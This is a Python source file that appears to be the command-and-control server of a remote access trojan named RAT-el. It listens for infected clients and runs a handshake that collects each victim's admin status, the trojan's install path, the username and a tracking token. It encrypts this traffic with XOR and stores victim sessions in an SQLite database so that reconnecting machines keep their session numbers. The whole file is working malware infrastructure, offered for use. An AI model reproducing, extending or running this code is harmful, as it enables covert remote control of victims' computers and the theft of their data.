import socket
import threading
import time
import socket
import os

from .other import printColor
from .other import XOREncryption
from .other import generate_PBKDF2_key
from .sql import Sql
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT, SPLIT 


class Handler(threading.Thread):
    '''
    This class allows to manage the incoming connection, 
    it also has class attributes that are essential to the RATEL project such as dict_conn, number_conn, status_connection_display, etc...
    '''
    #Manage incoming connections with a thread system
    dict_conn={}# dict of list | dict = socket,address  Stores all socket, ip, port and connection health status.
    number_conn=0  #count number of connexions
    status_connection_display = True  #If this class attribute is true then all new connections will be displayed on the screen. 
    PBKDF2_Key = None #Generates the key to encrypt and decrypt data using the XOR algorithm.
    start_handler = False


    def __init__(self,host,port,display, ObjSql,password):

        threading.Thread.__init__(self)
        self.port = port 
        self.host = host
        self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.display = display
        self.ObjSql = ObjSql
        
        Handler.PBKDF2_Key = generate_PBKDF2_key(password)


    def initialization(self):
        """
        filled in the dictionary dict_conn via the database.
        (The socket is not saved by default in the database).
        """
        #self.ObjSql.setDB()
        list_of_rows = self.ObjSql.selectAll()

        if(bool(list_of_rows)): #verify if the list is empty
            for row in range(len(list_of_rows)):
                session = list_of_rows[row][0]
                sock = False #
                ip = list_of_rows[row][1]
                port =  "---"
                is_he_alive = False
                is_he_admin = self.ObjSql.setTrueOrFalse(list_of_rows[row][4])
                path_rat = list_of_rows[row][5]
                usename = list_of_rows[row][6]
                token = list_of_rows[row][7]
                select  = False

                Handler.dict_conn[session] = [session, sock, ip, port, is_he_alive, is_he_admin, path_rat, usename, token, select]
       
                Handler.number_conn = self.ObjSql.returnLastSession() + 1 #ok

        else:
            #print("[?] NOT Value in database.")
            pass


    def SuccessfullyQuit(self):
        try:
            print("\n")
            for key,value in Handler.dict_conn.items():
                if(value[NB_ALIVE]):
                    value[NB_SOCKET].close()
                    printColor("error","[-] {}:{} Connection closed.".format(value[NB_IP],value[NB_PORT]))
                
        except Exception  as e: 
            printColor("error","[-] Error closing a socket. Error: {}".format(e))
            pass
        
        self.sock_server.close()
        printColor("error","\n[-] Connexion server closed.")
    

    def run(self):
        Handler.status_connection_display = self.display

        while True:
            #Test if the port listening is good.
            try:
                self.sock_server.bind((self.host,self.port))
                break
            except OSError as e:
                printColor("error","[-] Port {} is already busy or you don't have permission to listen on this port !".format(self.port))
                #printColor("error","[-] "+str(e)+".")
                printColor("information","[?] The server will try again to listen on port {}. If the server is still unable to listen on the port {} make sure to check which service is blocked with: netstat -petulan |grep {} command.".format(self.port,self.port,self.port))
                time.sleep(5)
                print("\n")
                
        Handler.start_handler = True #You can start the management 
        
        self.sock_server.listen(5) #https://stackoverflow.com/questions/41595176/accept-unlimited-connections-with-socket

        printColor("information","[+] the server listens on the port {}".format(self.port))

        while True:               
            
            conn,address = self.sock_server.accept()

            handshake = HandShake(conn,address,self.ObjSql)
            handshake.start()
            handshake.join()


class HandShake(threading.Thread):
  
    '''
This class is used to manage connections once the accepted function has been called.
Manual control allows to add crucial information like username, RAT and stores etc. to the main dictionary.
The client first sends this information, then the server sends the parameters as auto persistence. 

    '''
    def __init__(self, conn, address,ObjSql):
        
        threading.Thread.__init__(self)
        self.conn = conn
        self.address = address
        self.ObjSql = ObjSql


    def checkString(self, string_to_test, string_len_max):
        
        '''
        test if the string is too big.
        If the string is too big it can cause display bugs.
        '''

        result = ""
        i = 0
        string_to_test = str(string_to_test)

        while(True):
            
            if(i >= len(string_to_test)): 
                break
            
            elif(i >= string_len_max):
                break
            
            else:
                try:
                    
                    result += string_to_test[i]
                except IndexError as e:
                    #print("-->",e)
                    break
                else:
                    i+= 1

        return result


    def recvUltraSafe(self):
        data = ""
        self.conn.settimeout(SOCK_TIMEOUT)
        try:
            data = self.conn.recv(4096).decode("utf-16-le","replace")
        except socket.timeout:
            #print("timeout in recvultrasafe")
            pass
        except Exception as e:
            printColor("error", "[-] Error in recvUltraSafe: {} .\n".format(e))
        else:   
            try:
                self.conn.send(XOREncryption("\r\n",Handler.PBKDF2_Key).encode("utf-16-le"))
            except Exception:
                printColor("error", "[-] Error in recvUltraSafe when confirming.")
 
        self.conn.settimeout(None)
        
        return XOREncryption(data,Handler.PBKDF2_Key)
    

    def recvFirstInfo(self):
        #Collect informations with Handshake client.
        #if the client sends MOD_RECONNECT it means that the client tries to reconnect, to be sure the client sends a tokken.
        #If the client tries to reconnect this function returns a tuple containing (True and the number of sessions).

        list_info = []
        already_in_the_dictionary = False
        
        is_admin = "UNKNOWN"
        path_prog = "UNKNOWN"
        name_user = "UNKNOWN"
        token = "UNKNOWN"

        max_error = 0 #if max error > 4 stop  loop while. 

        while True:
            data = self.recvUltraSafe()
            
            if(data == "\r\n"):
                break
           
            tmp = data.split(SPLIT)
            if(tmp[0]=="MOD_RECONNECT"): #MOD_RECONNECT  | TOKEN fdsafafsdfsadf3454sdfasdf5

                token = tmp[1]
                if bool(Handler.dict_conn): 
                    for target in Handler.dict_conn.values():
                        if(target[NB_TOKEN] == token and target[NB_IP] == self.address[0]): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
                            #print("!!!!Token doublon!!!!")
                            
                            if not (target[NB_ALIVE]): #if target is not already alive:
                                '''
                                If several customers have the same token it means that a machine has executed the RAT several times.
                                In this case the server attributes the number of sessions according to the live connections. 

                                This means that for example if there are 3 clients with the same token on the server. client number 1 can become number 3.
                                '''
                                already_in_the_dictionary = True
                                nb_session_of_conn = target[NB_SESSION]
                        
                            else:        
                                pass

                else:
                    #dict empty
                    pass
            
            elif(tmp[0] == "MOD_HANDSHAKE_IS_ADMIN"):
                is_admin = self.checkString(tmp[1], 10)
                
            elif(tmp[0] == "MOD_HANDSHAKE_PATH_PROG"):
                path_prog = self.checkString(tmp[1], 256) 
            
            elif(tmp[0] == "MOD_HANDSHAKE_NAME_USER"):
                name_user  = self.checkString(tmp[1], 80)

            elif(tmp[0]=="MOD_HANDSHAKE_TOKEN"):
                token = self.checkString(tmp[1], 40)

            else:
                printColor("error","[-] An error occurred during handshake mode.")
                printColor("error","[-] Information may be recorded as UNKNOWN.\n")
                
                if(max_error > 4): #4 error max
                    printColor("error","[-] too many errors occurred when receiving information from the client.\n")
                    break
                else:
                    max_error +=1 
                

        #append data in dict
        if(already_in_the_dictionary):
            tpl = already_in_the_dictionary, nb_session_of_conn 
            return tuple(tpl)
        
        else:
            list_info.append(is_admin)
            list_info.append(path_prog)
            list_info.append(name_user)
            list_info.append(token)
            return list_info


    def run(self):

        info = self.recvFirstInfo() #Collect informations with Handshake client. 

        if(bool(info)):#if not empty
            if type(info) == list:
                if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
                    self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3])
                Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3], False] #3 #True = Connexion is life 
                
                if(Handler.status_connection_display):
                    printColor("information","\r[+] New client {}:{}".format(self.address[0],self.address[1]))
                
                Handler.number_conn+=1 
        
            if type(info) == tuple:#If the client tries to reconnect: | return Bool
                #print("Reconnect change dict.")
                nb_session = info[1]

                if(Handler.status_connection_display): #A TESTER !!
                    printColor("information","[+] A client is trying to reconnect to the server: session: {} {}:{}".format(nb_session,self.address[0],self.address[1]) )

                #Session number does not change value
                Handler.dict_conn[nb_session][NB_SOCKET] = self.conn
                Handler.dict_conn[nb_session][NB_IP] = self.address[0]
                Handler.dict_conn[nb_session][NB_PORT] =  int(self.address[1])
                Handler.dict_conn[nb_session][NB_ALIVE] =  True
                
                #other information does not change:
                #The information is retrieved from the database to the dictionary:

                Handler.dict_conn[nb_session][NB_ADMIN] = self.ObjSql.returnValue(nb_session,"is_he_admin")
                Handler.dict_conn[nb_session][NB_PATH] = self.ObjSql.returnValue(nb_session,"path_RAT")
                Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(nb_session,"username")
                Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(nb_session,"token")
                Handler.dict_conn[nb_session][NB_SELECT] = False 
                
        else:
            #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
            pass 

       
